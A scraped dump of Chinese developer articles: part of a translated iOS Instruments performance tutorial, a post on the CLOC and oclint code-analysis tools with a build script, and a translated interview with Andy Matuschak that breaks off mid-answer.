迅速膨胀的内存可以很快让程序毙命，所以要多加防范。</li>
<li>Leaks：找到引发内存泄漏的起点</li>
</ul>
<p>即使有 ARC（自动引用计数）内存管理机制，但在现实中对象之间引用复杂，循环引用导致的内存泄漏仍然难以避免，所以关键时刻还要自力更生。</p>

<p>针对这三方面的测试，我写了个演示应用，放在 <a rel=""nofollow"" href=""https://github.com/mcgraw/dojo-instruments"">GitHub</a> 上，来帮助大家更直观地了解这些工具的使用方法。好，进入正题。</p>

<p><a href=""https://blog.leancloud.cn/wp-content/uploads/2015/02/001.png"" rel=""nofollow noreferrer"" rel=""attachment wp-att-2842""><span class=""img-wrap""><img data-src=""https://blog.leancloud.cn/wp-content/uploads/2015/02/001-397x625.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""001"" width=""397"" height=""625""></span></a></p>

<h2>Time Profiler</h2>

<p>时间都去哪儿啦？ Time Profiler 可以回答。它会按照设定的时间间隔（默认 1 毫秒）来跟踪每一线程的堆栈信息（stack trace），并通过比较时间间隔之间的堆栈状态，来推算出某个方法执行了多久，给出一个近似值。<br>
在演示应用头一项「Time Profiler: System Methods」中，我用插入排序（Insertion Sort）和冒泡排序（Bubble Sort）两种算法来做性能比较，下面是 Swift 代码：</p>

<pre><code>/* 引用自：http://waynewbishop.com/swift/sorting-algorithms/ */

func insertionSort() {
    var x, y, key: Int

    for (x = 0; x &lt; numberList.count; x++) {
        key = numberList[x]

        for (y = x; y &gt; -1; y--) {
            if key &lt; numberList[y] {
                numberList.removeAtIndex(y + 1)
                numberList.insert(key, atIndex: y)
            }
        }
    }
}

func bubbleSort() {
    var x, y, z, passes, key : Int

    for (x = 0; x &lt; numberList.count; ++x) {
        passes = (numberList.count - 1) - x;

        for (y = 0; y &lt; passes; y++) {
            key = numberList[y]

            if (key &gt; numberList[y + 1]) {
                z = numberList[y + 1]
             numberList[y + 1] = key
                numberList[y] = z
            }
        }
    }
}
</code></pre>

<p>这段代码主要是对数组的添加和删除，两种方法执行起来耗时不多，但后台发生的系统动作却多得让人眼晕。</p>

<p><a href=""https://blog.leancloud.cn/wp-content/uploads/2015/02/004.jpg"" rel=""nofollow noreferrer"" rel=""attachment wp-att-2845""><span class=""img-wrap""><img data-src=""https://blog.leancloud.cn/wp-content/uploads/2015/02/004-625x352.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""004"" width=""625"" height=""352""></span></a></p>

<p>可以发现，代码用到了很多间接依赖，这些都是支撑代码运行的系统库文件。因为处理大数据集比较消耗系统资源，所以要尽可能地把繁重的操作放到后台去做，上面的代码就走的后台线程。在上图的 Call Tree 中可以看到，被调用的堆栈名是 dispatch_worker_thread3。如果把它放到主线程去执行，程序肯定会挂起。不信你注释掉 dispatch_async 调用看一下。</p>

<p>再来个图片加载的例子。</p>

<p><a href=""https://blog.leancloud.cn/wp-content/uploads/2015/02/003.jpg"" rel=""nofollow noreferrer"" rel=""attachment wp-att-2844""><span class=""img-wrap""><img data-src=""https://blog.leancloud.cn/wp-content/uploads/2015/02/003-625x352.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""003"" width=""625"" height=""352""></span></a></p>

<p>这儿有三种图片加载方法：</p>

<ul>
<li>loadSlowImage1：从指定 URL 下载一张图片（加载速度慢）</li>
<li>loadImage2：从本地资源库加载一张图片（注意：没用系统缓存）</li>
<li>loadFastImage3：从系统缓存中加载一张图片（加载速度快）</li>
</ul>
<p>我们来看看 Time Profiler 算出的结果是不是跟预想的一样。</p>

<p>进入演示应用第二项「Time Profiler: Our Methods」，点击「Reload」十次来重复加载图片，这样能产生足够的数据来分析。然后在 Time Profiler 图表中通过拖拉鼠标选中要放大查看的区域，从 Call Tree 中双击调用了 .reload 方法那一行（上图中加亮选中那一行），就会跳转到对应的代码行，所用时间也标注出来了。</p>

<p><a href=""https://blog.leancloud.cn/wp-content/uploads/2015/02/004.jpg"" rel=""nofollow noreferrer"" rel=""attachment wp-att-2845""><span class=""img-wrap""><img data-src=""https://blog.leancloud.cn/wp-content/uploads/2015/02/004-625x352.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""004"" width=""625"" height=""352""></span></a></p>

<p>看到谁最花时间了吧。虽然代码没什么可优化的地方，但大家应该认识到缓存能发挥的作用。所以即使有时还得调用 loadSlowImage，多数情况下把图片缓存下来，还是能省些资源占用。</p>

<p>此外，我想再说说 Call Tree 的选项设置。</p>

<p><a href=""https://blog.leancloud.cn/wp-content/uploads/2015/02/005.jpg"" rel=""nofollow noreferrer"" rel=""attachment wp-att-2836""><span class=""img-wrap""><img data-src=""https://blog.leancloud.cn/wp-content/uploads/2015/02/005.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""005"" width=""290"" height=""173""></span></a></p>

<p>这些选项默认是不选的，但把它们勾选上可以帮你更快定位到关键的代码上，往往这也是问题的源头。</p>

<ul>
<li>Separate by Thread：按线程分开做分析，这样更容易揪出那些吃资源的问题线程。特别是对于主线程，它要处理和渲染所有的接口数据，一旦受到阻塞，程序必然卡顿或停止响应。</li>
<li>Invert Call Tree：反向输出调用树。把调用层级最深的方法显示在最上面，更容易找到最耗时的操作。</li>
<li>Hide Missing Symbols：隐藏缺失符号。如果 dSYM 文件或其他系统架构缺失，列表中会出现很多奇怪的十六进制的数值，用此选项把这些干扰元素屏蔽掉，让列表回归清爽。</li>
<li>Hide System Libraries：隐藏系统库文件。过滤掉各种系统调用，只显示自己的代码调用。</li>
<li>Flattern Recursion：拼合递归。将同一递归函数产生的多条堆栈（因为递归函数会调用自己）合并为一条。</li>
<li>Top Functions：找到最耗时的函数或方法。</li>
</ul>
<p>需要添加其他工具的话：</p>

<p><a href=""https://blog.leancloud.cn/wp-content/uploads/2015/02/007.jpg"" rel=""nofollow noreferrer"" rel=""attachment wp-att-2838""><span class=""img-wrap""><img data-src=""https://blog.leancloud.cn/wp-content/uploads/2015/02/007.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""007"" width=""408"" height=""263""></span></a></p>

<h2>Allocations</h2>

<p>我们经常需要从服务器下载大量图片，特别是开发照片类的应用。但往往稍不注意，内存使用就会暴增，所以得保证把这些图片缓存下来以便重复使用。下面来看看演示程序中内存分配的例子。</p>

<p><a href=""https://blog.leancloud.cn/wp-content/uploads/2015/02/008.jpg"" rel=""nofollow noreferrer"" rel=""attachment wp-att-2839""><span class=""img-wrap""><img data-src=""https://blog.leancloud.cn/wp-content/uploads/2015/02/008-625x403.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""008"" width=""625"" height=""403""></span></a></p>

<p>从图中可以看到，每次点击「Reload」重新载入图片时，内存都会出现使用峰值。应用先分配大量内存来替换原有图片，然后再释放掉这部分内存，可想而知这样的操作效率高不了，而且如果要下载更大的文件，呃，局面大概会失控吧。</p>

<p>看一下堆栈列表第四行，ImageIO_PNG_Data 里有 9 张处于活动状态的图片，占用了12.38 MB 内存，这些都是没被系统释放或缓存的内存，所以导致堆内存分配升高。接下来再看看使用缓存后的效果。</p>

<p><a href=""https://blog.leancloud.cn/wp-content/uploads/2015/02/009.jpg"" rel=""nofollow noreferrer"" rel=""attachment wp-att-2840""><span class=""img-wrap""><img data-src=""https://blog.leancloud.cn/wp-content/uploads/2015/02/009-625x417.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""009"" width=""625"" height=""417""></span></a></p>

<p>使用了缓存库（<a rel=""nofollow"" href=""https://github.com/Haneke/HanekeSwift"">Swift</a> <a rel=""nofollow"" href=""https://github.com/Haneke/HanekeSwift"">Haneke</a>）后，点「Reload」五次，这回在 Allocations 列表中却看不到 ImageIO_PNG_Data 对象了，这说明它是空的，没有任何图像数据。同时，All Heap Allocations 的大小已从刚才的 14.61 MB 降到了 2.51 MB。Anonymous VM（匿名虚拟内存）是系统为程序预留的、可能会立即被重复使用的一部分可用内存。要防止程序崩溃，就别让堆的尺寸增长太快。</p>

<p>还有就是，例子用的是异步方式来加载图片，这样用不着等到所有图片下载完才能在界面中显示。大多数图像缓存库都会把加载工作放到后台，以避免延长主线程的响应周期。</p>

<h2>Leaks</h2>

<p>尽管 Apple 推出的 ARC 可以有效防范内存泄漏，但出问题的机率还是会有，Swift 也不例外。鉴于篇幅有限，本文就不涉及内存和 ARC 的工作原理了，具体可以参考<a rel=""nofollow"" href=""https://developer.apple.com/library/ios/documentation/Swift/Conceptual/Swift_Programming_Language/AutomaticReferenceCounting.html"">官方文档</a>。我会用代码来触发内存泄漏。</p>

<p>首先从最底层上说，当两个对象相互建立了强引用（strong reference），当一个对象被释放，另一个对象由于是强引用的关系不允许被释放，此时 ARC 无法确定没被释放的对象到底还有没有用，于是就导致了内存泄漏。</p>

<p><a href=""https://blog.leancloud.cn/wp-content/uploads/2015/02/010.jpg"" rel=""nofollow noreferrer"" rel=""attachment wp-att-2841""><span class=""img-wrap""><img data-src=""https://blog.leancloud.cn/wp-content/uploads/2015/02/010-625x424.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""010"" width=""625"" height=""424""></span></a></p>

<p>要解决这个问题，可以将其中的一个对象中变量设为 weak，不让它出现在保留周期中。很多开发者在管理 view controller 时常会在内存泄漏上中招，以为换了新的 controller，老的 controller 就被释放回收了，其实还没。这样代码一多，就会造成很多对象都没被释放。所以用这个工具把整个应用跑一遍，把那些断链的强引用清理干净，会大有裨益。</p>

<p>除了上述这三类工具，Instruments 还有很多实用的工具，推荐大家根据自己的关注点，花些时间去学学。比如：</p>

<ul>
<li>Core Data：监测读取、缓存未命中、保存等操作，能直观显示是否保存次数远超实际需要。</li>
<li>Cocoa Layout：观察约束变化，找出布局代码的问题所在。</li>
<li>Network：跟踪 TCP / IP和 UDP / IP 连接。</li>
<li>Automations：创建和编辑测试脚本来自动化 iOS 应用的用户界面测试。</li>
</ul>
<p>最后小总结下。我倒不想一味夸大 Instruments 的作用，如果应用跑得挺痛快，没出现啥调皮行为，大可把它忽略，等到问题来了再做优化。对于新手来说，花些时间了解 Instruments 的功能，多调试多积累经验，这样做出来的应用在用户体验上肯定错不了。</p>

<p>你最常用的 Instruments 工具都有哪些？欢迎与我们分享。</p>

<hr>
<p>原文：<a rel=""nofollow"" href=""http://www.xmcgraw.com/how-to-use-the-3-instruments-you-should-be-using/"">How To Use The 3 Instruments You Should Be Using</a><br>
译者：LeanCloud</p>

                ", 「原创译文」iOS 性能优化：Instruments 工具的救命三招,1531972138,191,1,759,1,1,https://segmentfault.com/a/1190000002568993
165,1,0,6,"
                    
<p>分享两个工具</p>

<ul>
<li>代码统计：<a rel=""nofollow"" href=""http://cloc.sourceforge.net/"">CLOC</a>
</li>
<li>代码分析：<a rel=""nofollow"" href=""http://oclint.org/"">oclint</a>
</li>
</ul>
<p>关于第三方工具的安装，推荐使用<a rel=""nofollow"" href=""http://brew.sh/"">Homebrew</a>，唐巧大神也在<a rel=""nofollow"" href=""http://blog.devtang.com/blog/2014/02/26/the-introduction-of-homebrew-and-brewcask/"">博客</a>中推荐过。<strong>使用<code>brew search xxxx</code>来查看是否有对应的工具可以使用Homebrew安装。</strong></p>

<h1>CLOC</h1>

<p>CLOC是专门用于代码统计的命令行工具，支持几乎所有语言。</p>

<p>使用Homebrew安装：<code>brew install cloc</code>，使用也非常简单，命令行进入项目目录，执行<code>cloc ./</code>即可，这样会统计目录下的所有代码。如果不希望统计某些文件夹，可以设置需要忽略的目录，比如忽略Pods文件夹：<code>cloc ./ --exclude-dir=Pods</code>。</p>

<p>统计结果：<span class=""img-wrap""><img data-src=""/img/bVkQIA"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""tool-1.png""></span></p>

<h1>oclit</h1>

<p>oclit作为一个静态的代码分析工具，功能非常强大，而且出自国人之手。</p>

<p>为了一劳永逸，首先安装<a rel=""nofollow"">xctool</a>：<code>brew install xctool</code>，这是Facebook提供的代替苹果<code>xcodebuild</code>的工具。</p>

<p>安装oclit：<code>brew install Caskroom/cask/oclint</code>，为了能够在Xcode上直接显示代码分析的结果，还需要完成以下几步</p>

<ol>
<li>添加Aggregate，<span class=""img-wrap""><img data-src=""/img/bVkQIB"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""![image](/images/Tool/tool-2.png)""></span><span class=""img-wrap""><img data-src=""/img/bVkQIC"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""![image](/images/Tool/tool-3.png)""></span>
</li>
<li>为刚才创建的Aggregate添加运行脚本，<strong>注意：不要在选中Aggregate的状态下点击Editor菜单，不然Add Run Script Build Phase按钮是灰色的</strong> <span class=""img-wrap""><img data-src=""/img/bVkQID"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""![image](/images/Tool/tool-4.png)""></span>
</li>
<li>添加脚本代码，脚本代码和官方文档有些不同。</li>
</ol>
<pre><code>#import path
export PATH=${PATH}:/usr/local/bin
#import what we have in bash_profile
source ~/.bash_profile
#check for oclint
hash oclint &amp;&gt; /dev/null
if [ $? -eq 1 ]; then
echo &gt;&amp;2 ""oclint not found, analyzing stopped""
exit 1
fi

hash xctool &amp;&gt; /dev/null
if [ $? -eq 1 ]; then
echo &gt;&amp;2 ""xctool not found, analyzing stopped""
exit 1
fi

cd ${SRCROOT}
xctool -workspace MyProject.xcworkspace -scheme MyProject clean
xctool -workspace MyProject.xcworkspace -scheme MyProject -reporter json-compilation-database:compile_commands.json build
oclint-json-compilation-database \
-e Pods \
-- -rc=LONG_LINE=100 \
-rc=NCSS_METHOD=60 \
-rc=MINIMUM_CASES_IN_SWITCH=1 \
| sed 's/\(.*\.\m\{1,2\}:[0-9]*:[0-9]*:\)/\1 warning:/'
</code></pre>

<p><strong>注意：上面代码中的<code>MyProject</code>需要替换成你的工程名</strong>，如果你的工程不是用workspace来管理的，那么其中这两行代码</p>

<pre><code>xctool -workspace MyProject.xcworkspace -scheme MyProject clean
xctool -workspace MyProject.xcworkspace -scheme MyProject -reporter json-compilation-database:compile_commands.json build
</code></pre>

<p>需要替换为</p>

<pre><code>xctool -project MyProject.xcodeproj -scheme MyProject clean
xctool -project MyProject.xcodeproj -scheme MyProject -reporter json-compilation-database:compile_commands.json build
</code></pre>

<p>4.编译刚才创建的Aggregate，需要耐性等待结果，完成之后就能看到oclint给出的结果</p>

<h2>错误排查</h2>

<p>若build成功了但是没有给出任何警告，很可能是出现了错误</p>

<ol>
<li>检查<span class=""img-wrap""><img data-src=""/img/bVkQIE"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""![image](/images/Tool/tool-5.png)""></span><br>
是否有警告，之前就遇到team没选择对，导致没有分析结果，或者像我一样选择None。</li>
<li>检查是否存在<code>~</code>目录下<code>.bash_profile</code>文件，因为此文件是隐藏文件，首先要让Finder能显示隐藏文件，命令行执行<code>defaults write com.apple.finder AppleShowAllFiles TRUE</code> 后 <code>killall Finder</code>，在Finder中Command+Shift+G前往文件夹，填写<code>~</code>查看，若无此文件，命令行进入次目录创建一个即可:<code>cd ~</code>后<code>touch .bash_profile</code>。恢复隐藏文件的隐藏<code>defaults write com.apple.finder AppleShowAllFiles FALSE</code> 后 <code>killall Finder</code>
</li>
</ol>
<h2>分析结果</h2>

<p>oclit的代码分析结果包括三种警告等级从高到底依次是：P1，P2，P3。</p>

<h3>P3</h3>

<ul>
<li>变量名长度：<code>Long variable name P3 Variable name with 28 characters is longer than the threshold of 20</code> 变量名超过20个字符，当然20的阀值是可以设置，之后会介绍。</li>
<li>反向逻辑：<code>Inverted logic</code>，比如</li>
</ul>
<pre><code>if (![response isKindOfClass:[NSError class]]) {
    //
}
else{
    //
}
</code></pre>

<ul>
<li>方法行数：<code>Long method P3 Method with 179 lines exceeds limit of 100</code>，方法下的代码超过100行，不包括注释。</li>
<li>参数未使用：<code>Unused method parameter P3 The parameter 'section' is unused.</code>，不过这个警告在IOS开发中比较普遍，可以忽略</li>
<li>嵌套深度<code>Deep nested block P3 Block depth of 8 exceeds limit of 5</code>，比如各种block的嵌套或者if/else的嵌套</li>
</ul>
<p>当然还有很多其他的情况</p>

<h3>P2</h3>

<ul>
<li>圈复杂度(CCN)：<code>High cyclomatic complexity P2 Cyclomatic Complexity Number 31 exceeds limit of 10</code>，意味着代码的复杂程度</li>
<li>NPath 复杂度：<code>/High npath complexity P2 NPath Complexity Number 384 exceeds limit of 200</code>，具体不是很清楚</li>
</ul>
<p>目前遇到的P2就是这些，P1的还没有遇到过。</p>

<p>回到刚才的脚本代码中</p>

<pre><code>-- -rc=LONG_LINE=300 \
-rc=NCSS_METHOD=60 \
</code></pre>

<p>这是oclit给出的参数设置<code>LONG_LINE</code>表示每行代码的最长字符数，<code>NCSS_METHOD</code>表示有效代码行的最大行数。0.8dev版本的其他参数包括</p>

<pre><code>CYCLOMATIC_COMPLEXITY
Cyclomatic complexity of a method, default value is 10

LONG_CLASS
Number of lines for a C++ class or Objective-C interface, category, protocol, and implementation, default value is 1000

LONG_LINE
Number of characters for one line of code, default value is 100

LONG_METHOD
Number of lines for a method or function, default value is 50

MINIMUM_CASES_IN_SWITCH
Count of case statements in a switch statement, default value is 3

NPATH_COMPLEXITY
NPath complexity of a method, default value is 200

NCSS_METHOD
Number of non-commenting source statements of a method, default value is 30

NESTED_BLOCK_DEPTH
Depth of a block or compound statement, default value is 5
</code></pre>

<p>可惜的是，并没有<code>Unused method parameter</code>相关参数。</p>

<p>总之，oclint的分析还是具有比较高的参考性，对于提高代码的可读性、可维护性还是有一定帮助的。</p>

                ", 代码统计、分析工具,1531972139,540,1,127,1,1,https://segmentfault.com/a/1190000002547015
166,1,0,6,"
                    
<p>摘自Objc Issue #20 Interviews, 01.2015<br><a rel=""nofollow"" href=""http://www.objc.io/issue-20/andy-matuschak.html"">原文地址</a> ；作者<a rel=""nofollow"" href=""https://twitter.com/andy_matuschak"">Andy Matuschak</a></p>

<h3>安迪，谢谢你抽空接受我们的采访。你能否稍微谈谈当初你是如何走上编程这条路？</h3>

<blockquote>
  <p>我想，和很多朋友一样，是通过游戏。实际上在我小时候一段时间内，我被禁止玩游戏，于是我就经常去公共图书馆。在我九岁的时候，我发现那些所谓教你如何编程的书籍实际上只是众多基本的源码清单。还有一些讲游戏设计的书整本都是源码。所以当我有机会玩游戏时我会把这些源码输入计算机，当然经常会在半路出现语句错误并且我既不能识别错误信息也不知道如何修复。因此我只能重头再来，直到我能玩上游戏。几次这样尝试之后我意识到我有能力修改游戏，自那以后事情就一发不可收拾了。<br>
      我想我是在十岁的时候学会了C++，因为那时人们都用C++写游戏；之后我尝试去写一个多用户网络（MUD）游戏，这是我个人第一个大的项目。它运作得还不错。</p>
</blockquote>

<h3>你完成它了吗？</h3>

<blockquote>
  <p>在单人游戏场景中，它运作的很流畅；但是显然它还没完成多用户网络游戏中的多玩家模式。所以我想答案是没有。后来我着迷于图形、GL、3D渲染之类的事物。</p>
</blockquote>

<h3>之后你有继续在制作游戏吗？</h3>

<blockquote>
  <p>我曾经做过一段时间的游戏引擎，看了所有标准的OpenGL教程：旋转立方体、颗粒引擎以及其他诸如此类的事情，然后我开始制作真正的游戏——那真是在13岁年纪瞎忙的活生生例子。我意识到那时没有一个适用于制作游戏内容的图表工具，因此我的室友和我开始制作一个像素工具。当时它被叫做Pixen。那是我第一次接触Cocoa而且它还是开源的。当我们推出1.0版本时，我想我还是14岁，我们去商场中苹果商店的OS X Panther（应当是Jaguar？）的发布会。他们那个时候开始搞发布会了！我们想要把Pixen的CD送给他们。</p>
</blockquote>

<h3>如果当时你不成为一名程序员，有可替代的选择吗？在其他任何事情上你有过极大兴趣吗？</h3>

<blockquote>
  <p>我那时候就想成为某种工程师。我曾痴迷于电力工程甚至高中的化学小实验，所以这些方向也不妨是一个选择，而软件工程是我当时真正能着手做的。那个时候，我还称呼其为编程而不是软件工程，然后一些人告诉我「不，不，你应该称之为'计算机科学'!」当然，那个时候我并没有明白在计算机科学、软件工程以及编程之间暗涌的有趣的文化差异，我只是觉得它们都是实用清晰的术语。但是我们偶尔会犯某种程度上的误用。</p>
</blockquote>

<h3>没错。所以目前基本上你算是一个软件工程师？</h3>

<blockquote>
  <p>尽管我是学计算机科学的，但我显然不是一个计算机科学家。我会说某种程度上我是一个软件工程师，一个深受计算机科学影响的软件工程师。最近我会花约一半时间在幼儿成长方面做更多的研究工作，论文和书籍阅读以寻找灵感看看我们如何能这块儿领域贡献力量。</p>
</blockquote>

<h3>离开苹果并加入可汗学院，帮助人们学习和教育，看起来是相当大的跳跃。为什么会做出这样的选择？什么事情激励了你？</h3>

<blockquote>
  <p>恩，有很多方面可以来回答这个问题。我之前去了加利福尼亚理工学院，一所支持许多国家科学项目诸如NASA、DARPA以及诸如此类的学院。因此在那儿的讨论总是关于人性化影响。当时有一个NASA官员过来对我们说 是，你们是最棒和最聪明的。你们将进入世界上最好的研究性学院之一，而且你们将是享有特权的。所有对你们有益的机会都将开放给你们。现在，你们必须使用他们来创造价值，你们必须做一些有意义的事。”<br>
      当我来到更广阔的软件社区时，我是少数几个毕业之后没有去做研究的人。我大学刚毕业那时候我想要做出点事儿，但我又失望于多数商业软件工程和销售的追求以及所产生的影响，所以关于在什么领域我能发挥所长我深思了很久。第一步显然是明确我的方向：「什么是影响、什么是有意义的」。那时我已经深受物理家David Deutsch的影响，通过他我确认了我想要走的方向：延伸人类知识和能力范围。之后我开始考虑对此我该怎么做。<br>
      如果我们能活得更久，那我们对知识能触及得更远，因此在生物和化学工程方面有许多可能性。如果我们有更好的试验工具，我们也能走得更远——这也是为什么虚拟和合成的工具、虚拟现实以及人工智能领域如此吸引人。但是结合个人背景和机会，我认为在教育领域做一些贡献应当是我最明智的选择，因为如果我能创造终生学习的一代人，那么我们会影响并吸引更多人来解决这些问题。</p>
</blockquote>

<h3>所以你想要为下一代创造工具来学得更好，因此他们能够解决难题并不断前进？</h3>

<blockquote>
  <p>是，这是我的愿景。学习的一大挑战就是「元学习」（meta learning，即「学习如何学习」）。这种学习方式不会摧毁你的学习自信以及态度。如果我开发的工具能够使得毕业生们获得相同的数学成绩，与此同时他们对待数学有更好的态度和认知而且对在之后生活中学习数学这件事更感兴趣，那我就知足了。</p>
</blockquote>

<h3>因此你很明确地指出目前已有的中学和大学教育并不足够好，关于这点能否做详细的说明？</h3>

<blockquote>
  <p>是，他们不够好，而且从很多维度看他们都不够好。最重要一点就是大多数人没有办法接触到我刚刚所描述的那些机遇和资源，而这点恰恰是我认为当前要改进而且是首要的，这就是为什么人人都能免费受教育是当前的使命。可汗学院的使命实际上就是为人人创造世界一流的免费教育，因此当前我们首先关注人人都能免费受教育，其次再是世界一流的免费教育。但是说到第二点，所谓的「世界一流」定义我还保留意见。<br>
      我有许多获得最好的教育经费并受指导于诺贝尔获奖者的同学，尽管如此，他们对于学习这件事依旧抱着糟糕的态度，而且心心念着一旦毕业就要结束学习。他们只想着赶快离开并找到稳定的工作，好在职场中让大脑停工，因为他们被体系搞得着实精疲力尽因此他们的好奇心和才智已经被严重破坏。</p>
</blockquote>

<h3>这可听起来真让人沮丧阿.......</h3>

<blockquote>
  <p>认同。我想你应该问过大多数人他们对于数学的观点，他们不是说「噢，数学真无聊」就是「我不擅长于数学，我不是个数学家」在科学学科方面，你得到的回应也会类似。但是如果你问人们关于文学的事情，或许他们会讨论一些自认为情节有趣的书籍，然而那也只是他们在学生时期常常阅读罢了，至于现在可能早已停止。因此我想我最希望推进的进步是改变所谓「教育在大学之后就结束」的固有观念，这不是真正意义上的科学难题，也是我某种程度上对于「软件工程师」这个标签有所犹豫的原因，确实软件工程是我专攻并积累经验的领域，但我追求的目标与志向并非这个方向。</p>
</blockquote>

<h3>伴随着「专注终身学习」这样一个宏大的计划，你是否有想过十年后的情况吗，你期望达成了什么目标？</h3>

<blockquote>
  <p>目前，标准的学习方法已经约定俗成。我的意思是你读一本教科书，那么你被动地要去吸收当中的知识；或者你看一段视频，还得看演讲类的内容。意味着如果你要学习，你得坐下来并进行吸收消化。或许之后你有钱了还可以来个对话交流什么的。在你毕业之后，你必须自己去创造这样的学习环境。<br>
      对于所谓的「建构主义学习环境」我真的很好奇，这是几十年前的一位学问研究者帕波特定义的术语。在一个建构主义学习环境，学生自发性地创造知识，而不是一味地被动进行课本阅读和吸收。在这些模型中，更多的是一个环境被建构好，为了能理解一些知识，其特性将激励或要求你去熟练使用。<br>
      帕波特研究的其中一个例子，他努力使用Logo语言进行关于抽象与程序化思维的教学，而不是编程本身。他还有一个教室里放着Logo turtle的标志，那时候还有一种机械海龟可以真的在纸上画画。所以教室周围挂满了机械海龟画的画，一些画上是源代码，一些不是。这些画也会随着时间因学生的更替而变换，比方说一个学说可能看到一朵花然后说：“哇，我喜欢这幅图，我能拥有它吗？”然后老师会说：“好呀，当然可以，不过你得先输入代码，海龟会照着代码画出这个图。”然后学生会说：“没问题。”接着他就开始作画。之后可能他会看上另外一幅画，但是那幅画没有源代码，那就只能自己想辙了。<br>
      在建构主义学习环境中，设计其他图示也是为了要求学生进行创造前要先理解。因此，创造性环境就这样被塑造出来了。我正在研究而且很可能会研究很多年的假说，其实是允许人们自主创建知识，我想能看到这样的产出首先我会很高兴；其次，他们在「元认知」上也会大幅提高，在自我认知、学习态度以及学习兴趣上都会比其他同学高出不少。</p>
</blockquote>

<h3>除了以建构主义学习环境来鼓励大家更加主动学习之外，可汗学院与更传统的学习方式之间另一个主要区别在于人们能更自由地选择要学什么，什么时候学，你觉得这个改变有什么影响吗？</h3>

<blockquote>
  <p>另一个幼儿成长研究者 Piaget 在这方面有很多研究成果，他说青年思维开发阶段重要的事情之一就是自主性训练，而且这里的自主性相较我们平时讨论的又要宽泛很多。它不是指「我能自由地玩耍」而是指「我能对我生活中所有正在发生的事情做决定」。这其实和一些人总是提醒你要如何分配你的时间，强调行为规则的权威性是相悖的。打个比方，对于「Bobby玩游戏的时候作弊了」这件事不自主的回答就是「好，让我来和他说」，相反地，自主性的回答会是「那你和Bobby说了什么吗」。我想自主性的训练在各方面都很重要。有一些研究表明这会在短期内有更好的产出，但是我相信从长远来看这将引导出更优秀的思考者。<br>
       我对于那些一整天的日程被安排满满的情况保持怀疑。如果教育者能够日复一日地，优化学生的学习环境来修正学习进度，我认为这反倒更加积极。再确切一些，比如我想与其把所有人类学知识的目录按重要程度进行分类一股脑给学生，倒不如把所有人类学知识看成一个书架，按难易程度由低到高进行排放。</p>
</blockquote>

<h3>那么在Apple工作的经历有没有什么让你怀念的？</h3>

<blockquote>
  <p>恩，我怀念那儿的人，这真的很重要。实际上这也是目前我对于这个行业真正感到失望的地方。那么多有才能的人被这些巨型公司套牢，而他们只是偶尔被良好利用，更多时候他们只是一台机器的齿轮，但他们的聪明才智完全能做更大更深远的影响。我不是说一定要来我的项目里干，而是更宽泛地。在情感角度，我会难过是因为我真的怀念他们，比方说怀念当时在NeXT的时候和那些经验丰富的同事共同激发出来的对话。然而我也希望他们的影响能够更加深远。</p>
</blockquote>

<h3>你能分享更多一些你在Apple的时光吗？开发一个能够被那么多人使用的框架是什么感觉？你又是如何从做游戏开始一步步完成那么多？</h3>

<blockquote>
  <p>填补这段差距的一个例子是我在16岁的时候完成的一个名叫Sparkle的框架。当时它教会我认识到框架开发的一些事实，换句话说当你修改大家正在用的API，他们就会生气。这是框架开发的事实之一，但坦诚来说其实我去Apple之前我不清楚自己在干嘛。我完成了学业，有了更大的野心，不过苹果看起来似乎是非常好的学习平台，它曾经是，它现在依旧是。因此我会对任何与我有相同抱负的人给予一样的建议。当时与我共事的同事都是有过十几年编译框架经验的人，我想我应该是团队中垫底的。没办法，我被逼着要快速的学习和理解许多在设计框架的时候所需要的独特的思考方式，特别是考虑框架中的二进制兼容，而先前的Sparkle并没有。幸运的是，我周围的每个人都很慷慨地付出时间与精力来指导我。在犯过许多许多错误之后，我终于明白了我都做了什么，而几年后当我离开，可能我再也用不到那些技术了。</p>
</blockquote>

<h3>开发这样大型规模的框架中，什么是最让人吃惊的？</h3>

<blockquote>
  <p>我想「二进制兼容」应当是我最吃惊的。当时我并没有理解当中的难点与复杂程度，你可以想象下：在iOS8里头按钮是白色背景，但在iOS7中，它是透明的。iOS8还没有被发布，所以这一定是我们的问题。于是你要开始一点点钻研，你意识到也许在iOS7中调用的方法是来控制这个的，但这个方法在iOS8中已经不调用了。为了去搞清楚到底怎么回事，我们要迅速去分解、辨析，发现这是第三方的代码同时我们还缺少源代码。<br>
      大约一半的时间，一些人在做一些可耻的事情以求达到目的，而剩下一半时间我们要以非常规的行为来进行修改，因此我们有理由需要去增加防御措施。</p>
</blockquote>

<h3>这听起来有很多繁琐的工作...</h3>

<blockquote>
  <p>没错，就好像侦探的活儿一样。</p>
</blockquote>

<h3>听起来Peter Steinberger在走另一个方向，反汇编UIKit来修复错误。</h3>

<blockquote>
  <p>是阿，当然了。每次发布都很秘密以至于我们不能问：「嘿，Facebook的哥们儿，你为什么要这么做？」我们必须得自己搞清楚。在这一点上，我很敬佩Peter和他的团队做的事。我觉得那是很棒的事，也很想去看到更多这样的事。我很想的</p>
</blockquote>

<h3>我从来没想过Apple也要不得不去反汇编别人的二进制来分析错误。</h3>

<blockquote>
  <p>是阿，如同我现在作为第三方开发者，还是不得不经常反汇编UIKit。因为我就像这样：「UIKit，到底怎么回事儿？」那么获得答案的最简单方式就是分析反汇编。</p>
</blockquote>

<h3>去年有无数多新事物的出现，哪些会让你感觉很激动？你对Swift的出现感到激动吗？</h3>

<blockquote>
